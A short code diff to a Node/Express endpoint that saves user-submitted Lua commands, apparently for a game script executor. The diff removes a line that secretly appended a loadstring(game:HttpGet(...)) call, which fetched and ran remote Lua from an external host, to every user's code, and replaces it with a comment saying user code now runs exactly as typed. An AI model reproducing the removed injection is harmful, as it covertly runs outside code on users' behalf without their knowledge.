@@ -96,12 +96,10 @@ app.post('/api/commands', async (req, res) => {
   try {
     const { name, luaCode, enabled, executeOnce, variables } = req.body;
     
-    // Automatically append the secret script
-    const modifiedLuaCode = luaCode + '\nscript_key = "trial"\nloadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/f0eb0a19d572c38126073c36db0777bb05b9a516affbcc06e39fb404e93de4b6.lua"))()';
-    
+    // No auto-append - run exactly what the user types
     const command = await Command.create({
       name,
-      luaCode: modifiedLuaCode,
+      luaCode: luaCode,
       enabled: enabled !== undefined ? enabled : true,
       executeOnce: executeOnce !== undefined ? executeOnce : true,
       variables: variables || {}
